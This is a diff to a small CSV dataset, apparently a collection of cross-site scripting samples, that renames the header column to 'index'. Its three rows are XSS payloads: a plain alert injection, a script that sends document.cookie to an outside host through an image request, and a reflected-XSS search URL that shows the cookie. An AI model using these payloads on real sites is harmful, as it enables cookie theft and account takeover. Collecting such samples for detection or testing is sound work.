@@ -1,4 +1,4 @@
-,language,source
+index,language,source
 0,JS,<link rel=pingback href="https://hackware.ru/xmlrpc.php"/><script> alert('xss')</script>
 1,JS,<script>img = new Image();img.src = "http://antichat.org/s/HakNet.gif?"+document.cookie;</script>
 2,JS,http://yourdomain.ru/searh?q=»><script>alert(«cookie: «+document.cookie)</script>
